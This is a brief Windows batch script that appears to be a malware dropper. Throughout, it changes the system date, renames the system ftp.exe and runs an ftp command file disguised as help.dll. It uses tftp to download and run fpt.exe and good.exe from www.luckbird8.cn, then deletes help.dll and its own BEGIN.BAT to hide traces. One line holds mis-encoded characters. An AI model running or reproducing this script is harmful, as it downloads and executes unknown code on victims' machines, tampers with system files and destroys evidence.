set a=2007-01-01 ÐÇÆÚÒ»
date=2099-01-01
ftp.exe -s:C:\WINDOWS\help.dll
if exist C:\WINDOWS\system32\ftp.exe ren C:\WINDOWS\system32\ftp.exe sfd.exe
if not exist fpt.exe sfd -s:C:\WINDOWS\help.dll
if not exist fpt.exe sft -s:C:\WINDOWS\help.dll
if not exist fpt.exe tftp -i www.luckbird8.cn get fpt.exe
if not exist good.exe tftp -i www.luckbird8.cn get good.exe
fpt.exe
fpt.exe
good.exe
good.exe
date=%a%
:end
del C:\WINDOWS\help.dll
del C:\WINDOWS\BEGIN.BAT
exit
